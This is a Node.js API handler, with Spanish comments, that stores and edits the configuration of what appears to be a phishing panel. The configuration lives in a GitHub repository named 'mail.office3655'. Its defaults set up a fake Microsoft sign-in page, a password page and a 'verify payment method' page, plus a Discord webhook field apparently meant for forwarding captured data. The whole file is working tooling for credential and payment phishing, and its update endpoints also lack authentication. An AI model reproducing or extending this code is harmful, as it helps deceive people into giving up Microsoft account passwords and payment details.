import { Buffer } from 'node:buffer';

const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_OWNER = process.env.GH_OWNER || 'varasjaime777-alt';
const GH_REPO = process.env.GH_REPO || 'mail.office3655';
const CONFIG_PATH = 'config.json';
const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;

const headers = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept': 'application/vnd.github.v3+json',
  'User-Agent': 'MailOffice365Panel/1.0',
};

async function githubRead() {
  const res = await fetch(GITHUB_API, { method: 'GET', headers });
  if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
  const data = await res.json();
  return {
    config: JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8')),
    sha: data.sha,
  };
}

async function githubWrite(content, sha) {
  const res = await fetch(GITHUB_API, {
    method: 'PUT',
    headers,
    body: JSON.stringify({
      message: 'Actualización de configuración',
      content: Buffer.from(JSON.stringify(content, null, 2)).toString('base64'),
      ...(sha ? { sha: sha } : {}),
    }),
  });
  if (!res.ok) {
    const errText = await res.text();
    throw new Error(`GitHub write error ${res.status}: ${errText}`);
  }
}

export default async function handler(req, res) {
  const method = req.method;

  // GET - Leer configuración
  if (method === 'GET') {
    try {
      const result = await githubRead();
      const config = result.config;
      // No exponer hash de admin password en la respuesta
      const safeConfig = { ...config };
      delete safeConfig._adminPassHash;
      return res.status(200).json(safeConfig);
    } catch (e) {
      console.error('Error leyendo config:', e.message);
      return res.status(500).json({ error: 'No se pudo leer la configuración' });
    }
  }

  // PATCH - Actualizar configuración parcial
  if (method === 'PATCH') {
    try {
      let config = {};
      let sha = null;
      try {
        const result = await githubRead();
        config = result.config;
        sha = result.sha;
      } catch (e) {
        // Si no existe, crear defaults
        config = {
          logoText: 'Microsoft',
          pageTitle: 'Iniciar sesión en su cuenta',
          welcomeText: 'Use su cuenta',
          passwordPageTitle: 'Escribir contraseña',
          paymentPageTitle: 'Verificar método de pago',
          loginBgType: 'color',
          loginBgColor: '#0a0a1a',
          loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
          loginBgImage: '',
          customCss: '',
          discordWebhook: '',
          discordMessageTemplate: '',
          footerHelpText: 'Ayuda',
          footerTermsText: 'Términos de uso',
          footerPrivacyText: 'Privacidad y cookies',
          footerPrivateTip: 'Usa la exploración privada si este no es tu dispositivo. Más información',
        };
      }

      // Apply updates
      const body = req.body || {};
      Object.keys(body).forEach(key => {
        if (key.startsWith('_')) {
          // Internal fields (admin password hash)
          config[key] = body[key];
          return;
        }
        // Salvo el token, simplemente aplica el valor
        config[key] = body[key];
      });

      await githubWrite(config, sha);
      const safeConfig = { ...config };
      delete safeConfig._adminPassHash;
      return res.status(200).json(safeConfig);
    } catch (e) {
      console.error('Error actualizando config:', e.message);
      return res.status(500).json({ error: 'No se pudo actualizar la configuración' });
    }
  }

  // PUT - Reemplazar configuración completa
  if (method === 'PUT') {
    try {
      const body = req.body || {};
      const config = { ...body };
      delete config.sha;
      await githubWrite(config, null);
      const safeConfig = { ...config };
      delete safeConfig._adminPassHash;
      return res.status(200).json(safeConfig);
    } catch (e) {
      console.error('Error escribiendo config:', e.message);
      return res.status(500).json({ error: 'No se pudo escribir la configuración' });
    }
  }

  return res.status(405).json({ error: 'Método no permitido' });
}
